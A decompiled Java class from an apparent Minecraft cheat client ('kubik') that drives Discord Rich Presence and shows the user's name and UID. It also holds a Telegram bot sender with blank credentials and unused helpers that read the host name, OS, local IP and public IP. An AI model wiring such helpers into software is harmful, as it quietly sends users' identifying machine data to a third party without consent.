/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package fun.kubik.utils.discord.rpc;

import fun.kubik.Load;
import fun.kubik.helpers.interfaces.IFastAccess;
import fun.kubik.managers.client.ClientManagers;
import fun.kubik.utils.discord.rpc.utils.DiscordEventHandlers;
import fun.kubik.utils.discord.rpc.utils.DiscordRPC;
import fun.kubik.utils.discord.rpc.utils.DiscordRichPresence;
import fun.kubik.utils.discord.rpc.utils.RPCButton;

import java.io.IOException;
import java.io.OutputStream;
import java.net.*;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.Scanner;
import lombok.Generated;
import ru.kotopushka.j2c.sdk.annotations.NativeInclude;
import protectguard.protect.UserInfo;

public class DiscordManager
        implements IFastAccess {
    private DiscordDaemonThread discordDaemonThread;
    private long APPLICATION_ID;
    private boolean running;
    private long startTimestamp;
    private String image;
    private String telegram;
    private String discord;

    public DiscordManager() {
        this.init();
    }

    @NativeInclude
    private void cppInit() {
        this.discordDaemonThread = new DiscordDaemonThread();
        this.APPLICATION_ID = 1373301366813888552L;
        this.running = true;
        this.image = "https://s14.gifyu.com/images/bNszu.gif";
        this.telegram = "https://t.me/kubikclient";
        this.discord = "https://discord.gg/eA8NTGVcaT";
    }


    @NativeInclude
    public String smallImages() {
        if (mc.getCurrentServerData() != null && ClientManagers.isReallyWorld()) {
            return "https://s4.gifyu.com/images/bsSAB.png";
        }
        if (mc.getCurrentServerData() != null && ClientManagers.isHolyWorld()) {
            return "https://s14.gifyu.com/images/bsnZ1.png";
        }
        if (mc.getCurrentServerData() != null && ClientManagers.isFuntime()) {
            return "https://s14.gifyu.com/images/bsnF7.png";
        }
        if (mc.getCurrentServerData() != null && ClientManagers.cake()) {
            return "https://s4.gifyu.com/images/bsSAB.png";
        }
        return "";
    }

    public String opisanie() {
        if (mc.getCurrentServerData() != null && ClientManagers.isConnectedToServer("metahvh")) {
            return "https://t.me/kubikclient";
        }
        return "";
    }
    
    // Новый метод для отображения информации о пользователе при наведении на картинку
    public String getUserTooltip() {
        return "Кубик пиздит";
    }

    public void init() {
        this.cppInit();
        DiscordRichPresence.Builder builder = new DiscordRichPresence.Builder();
        DiscordEventHandlers handlers = new DiscordEventHandlers.Builder()
                .ready(user -> {
                })
                .build();
        DiscordRPC.INSTANCE.Discord_Initialize(String.valueOf(this.APPLICATION_ID), handlers, true, "");
        this.startTimestamp = System.currentTimeMillis() / 1000L;
        builder.setStartTimestamp(this.startTimestamp);
        builder.setLargeImage(this.image, this.getUserTooltip());
        builder.setSmallImage(this.smallImages());
        builder.setButtons(RPCButton.create("Telegram", this.telegram), RPCButton.create("Discord", this.discord));
        DiscordRPC.INSTANCE.Discord_UpdatePresence(builder.build());
        this.discordDaemonThread.start();
    }

    public void updateRPC() {
        DiscordRichPresence.Builder builder = new DiscordRichPresence.Builder();
        builder.setStartTimestamp(this.startTimestamp);
        
        // Username в Details
        if (UserInfo.username != null && !UserInfo.username.isEmpty()) {
            builder.setDetails(UserInfo.username);
        } else {
            builder.setDetails("Unknown User");
        }
        
        // UID в State
        if (UserInfo.uid != null && !UserInfo.uid.isEmpty()) {
            builder.setState("UID: " + UserInfo.uid);
        } else {
            builder.setState("UID: Unknown");
        }
        builder.setLargeImage(this.image, this.getUserTooltip());
        builder.setSmallImage(this.smallImages());
        builder.setButtons(RPCButton.create("Telegram", this.telegram), RPCButton.create("Discord", this.discord));
        DiscordRPC.INSTANCE.Discord_UpdatePresence(builder.build());
    }

    public void sendTelegram(String message) {
        new Thread(() -> {
            try {
                String token = "";
                String chatId = "";
                String encoded = URLEncoder.encode((String)message, (Charset)StandardCharsets.UTF_8);
                String urlString = "https://api.telegram.org/bot" + token + "/sendMessage";
                HttpURLConnection connection = (HttpURLConnection)new URL(urlString).openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                String body = "chat_id=" + chatId + "&text=" + encoded;
                try (OutputStream os = connection.getOutputStream();){
                    os.write(body.getBytes());
                    os.flush();
                }
                connection.getResponseCode();
                connection.disconnect();
            } catch (Exception exception) {
                // empty catch block
            }
        }).start();
    }

    public void stopRPC() {
        DiscordRPC.INSTANCE.Discord_Shutdown();
        this.discordDaemonThread.interrupt();
        this.running = false;
    }

    @NativeInclude
    private String getPcName() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            return "Неизвестно";
        }
    }

    @NativeInclude
    private String getOsVersion() {
        try {
            String osName = System.getProperty("os.name");
            String osVersion = System.getProperty("os.version");
            String osArch = System.getProperty("os.arch");
            return osName + " " + osVersion + " (" + osArch + ")";
        } catch (Exception e) {
            return "Не удалось определить ОС";
        }
    }

    @NativeInclude
    private String getEntryTime() {
        try {
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("HH:mm:ss");
            return LocalDateTime.now(ZoneId.of("Europe/Moscow")).format(formatter);
        } catch (Exception e) {
            return "\u0412\u0440\u0435\u043c\u044f \u043d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u043e";
        }
    }

    @NativeInclude
    private String getLocalIp() {
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            return "\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c";
        }
    }

    @NativeInclude
    private String getPublicIp() throws IOException {
        Scanner s = new Scanner(new URL("http://checkip.amazonaws.com").openStream());
        try {
            String string = s.nextLine().trim();
            s.close();
            return string;
        } catch (Throwable throwable) {
            try {
                try {
                    s.close();
                } catch (Throwable throwable2) {
                    throwable.addSuppressed(throwable2);
                }
                throw throwable;
            } catch (Exception e) {
                return "\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c";
            }
        }
    }

    @Generated
    public DiscordDaemonThread getDiscordDaemonThread() {
        return this.discordDaemonThread;
    }

    @Generated
    public long getAPPLICATION_ID() {
        return this.APPLICATION_ID;
    }

    @Generated
    public boolean isRunning() {
        return this.running;
    }

    @Generated
    public long getStartTimestamp() {
        return this.startTimestamp;
    }

    @Generated
    public String getImage() {
        return this.image;
    }

    @Generated
    public String getTelegram() {
        return this.telegram;
    }

    @Generated
    public String getDiscord() {
        return this.discord;
    }

    private class DiscordDaemonThread
            extends Thread {
        private DiscordDaemonThread() {
        }

        @Override
        public void run() {
            this.setName("Discord-RPC");
            try {
                while (Load.getInstance().getDiscordManager().isRunning()) {
                    DiscordManager.this.updateRPC();
                    DiscordRPC.INSTANCE.Discord_RunCallbacks();
                    Thread.sleep(1000L);
                }
            } catch (Exception e) {
                DiscordManager.this.stopRPC();
            }
            super.run();
        }
    }
}

